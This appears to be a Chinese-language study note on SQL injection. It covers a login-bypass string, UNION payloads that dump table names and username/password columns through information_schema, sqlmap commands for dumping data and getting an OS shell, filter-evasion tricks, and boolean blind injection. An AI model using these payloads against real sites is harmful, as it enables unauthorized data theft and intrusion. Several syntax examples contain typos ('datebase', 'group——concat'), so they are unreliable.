### 1.数据库基础概念
数据库是电子化数据存储仓库，网站用户账号、订单、游戏装备、政务数据等全部存储在数据库中
主流数据库：MySQL、SQL Server、PostgreSQL、Oracle，Web 渗透中以 MySQL 最为常见
**数据库层级结构**：数据库服务器 → 多个数据库 → 多张数据表 → 多个字段（列） → 多行真实数据
**SQL语言**：结构化查询语言，标准化数据库操作语言，所有关系型数据库通用增删改查语句
### 2.SQL语法基础
**数据库操作**：
 1. 创建：`create datebase 库名;`
 2. 查看全部库：`show datebases;`
 3. 删除：`drop datebase 库名;`
 4. 切换使用库：`use 库名;`

**数据表操作**：
 1. 创建表：`create table 表名;`
 2. 查看库内所有表：`show tables;`
 3. 改名：`alter table 原名 rename to 新名;`
 4. 删除表：`drop table 表名;`

**数据增删改查**：
1. 新增：`insert into 表名 values(值1,值2...);`
2. 查询：`select * from 表名 where 条件;`
3. 修改：`update 表名 set 字段=值 where 条件;`
4. 删除：`delete from 表名 where 条件;`

**逻辑运算符**：
`AND(&&)`、`OR(||)`、`XOR(^)`、`NOT(!)`，注入永真 Payload 核心语法
### 3.SQL注入基础
**SQL注入原理&万能密码**：
 后端直接拼接用户输入到SQL语句，无过滤/预编译，攻击者闭合原有单引号、篡改查询逻辑
 示例：
	原语句：`select * from user where username='' and password=''`
	输入密码：`1' or '1`
	拼接后：`select * from user where username='admin' and password='1' or '1'` or'1'形成永真条件，绕过账号密码校验直接登录
**MySQL元数据库information_schema(手工注入核心)**：
MySQL5.0及以上自带内置库，存储全库、表、字段、元数据，是手工脱库关键：
1. `information_schema.schemata`:存储所有数据库名，对应show database
2. `information_schema.tables`:存储所有表名，table_schema对应所属库
3. `information_schema.columns`:存储所有字段名，记录表、库对应关系

**union联合查询注入完整流程**
1. 核心规则：前后两条select查询列数必须完全一致，否则报错；union自动去重，union all保留重复数据 
2. 判断查询字段数量：使用 `order by 数字`依次测试，报错时数字即为总列数，例：`1' order by 3#`正常、`1' order by 4#`报错 → 共3列
3. 多行数据合并函数 group——concat():将多条查询结果拼接为一行字符串，适配页面仅单行回显场景
4. 标准手工脱库四部Payload
	1. 查当前数据库：`union select database(),2,3#`
	2. 查当前库所有表：`union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#`
	3. 查表所有字段：`union select 1,group_concat(column_name),3 from information_schema.columns where table_name='表名'#`
	4. 读取账号密码数据：`union select 1,username,password from 目标表#`
5. 注释符：`#`，`-- `(减减空格)，`/*注释*/`，用于截断后端原有SQL单引号
### 4.SQLMAP 自动化注入工具
sqlmap是开源自动化SQL注入工具，支持MySQL,Oracle,SQLServer等全数据库，一键检测，脱库，执行系统命令
**基础脱库命令（GET型URL）**：
1. 枚举所有数据库：`python sqlmap.py -u "目标url" --dbs`
2. 枚举指定库所有表：`-D 库名 --tables`
3. 枚举指定表所有字段：`-D 库名 -T 表名--columns`
4. 导出表全部数据：`-D 库名 -T表名 -C字段1,字段2 --dump`
5. `--batch`:自动确认交互，无需手动输入选项

**高级功能命令**：
1. 执行系统交互shell：`--os-shell`(数据库高权限可用)
2. 执行自定义SQL语句：`--sql-shell`
3. 时间盲注专用：`technique=T --thread=10`(10线程加速)
4. POST抓包注入：`-r 抓包txt文件`（Burp导出http请求文本）
### 5.SQL注入各类过滤绕过
**逻辑关键词and/or过滤：**
- 替换：and=&&   or=||   not=!   xor=^
**select/union关键字过滤（黑名单）：**
- 大小写变形：seLeCt，UnIoN
- 双写绕过：selselectect,过滤删除中间select后还原关键字
- 十六进制编码字符串：`where username=0x61646D696E`（admin的16进制）
**空格过滤（拦截空格）：**
- 多行注释替代：`select/**/username/**/from/**/table`
- 特殊空白符：`%`0a换行，`%09`制表符，反引号`
- 括号包裹消除空格：select(username)from(table)
**等号=过滤：**
- `like`无通配符等价匹配：`username like 'admin'`
- `regexp`正则精确匹配：`username regexp '^admin$'`
- 大小于运算：`username>'admim' and username<'admio'`
- `!<>(不等于)`取反：`!(username<>'admin')`
**大于小于号><盲注过滤**
- 替代函数：`strcmp()`、`in()`、`between`、`greatest()`
**逗号，过滤（substr/limit/union 多字段）**
 - substr 逗号替换：`substr(str from pos for len)`
 - limit 逗号替换：`limit 2 offset 1`
- 多字段 union 无逗号：`union select * from (select a)a join (select b)b`
**内置函数过滤**
- `sleep(n)`延时盲注 → `benchmark(大数,1)`
- `substr/mid/left`互相替换
- `ascii()` → `ord()/hex()`
- `if()`条件判断 → `case when then else end`

### 进阶
#### union联合注入查询（首选）
**前置条件：**
	1.有回显。查询结果显示在页面上
	2. 列数一致。union要求两个select列数相同（union去重，union all不去重）
	3. 有回显位。原查询的某列会被打印，通常只显示一列
	1是有没有输出通道，3是通道在第几列
#### 布尔盲注
页面不显示数据，会因为条件的真假呈现两种不同状态，将页面的是非差异作为1bit的通道
函数                                    作用
`IF(expr,v1,v2)`                 expr成立返回v1，反之v2
`ASCII(s)`                           返回s第一个字符的ASCII码 
`SUBSTR(s,start,length)`   s的start位置截取length长度的子串（start从1起）
示例：
`if(ascii(substr(database(),1,1))=97,1,0)`
database()第一个字符ascii是97返回1，不是则返回0
`0 ||` 前缀法，让页面状态直接映射真假，提供干净的1bit通道
	`0|| if(substr(database(),1,1)='a',1,0)`
必须用ASCII原因：SQL语言不区分大小写
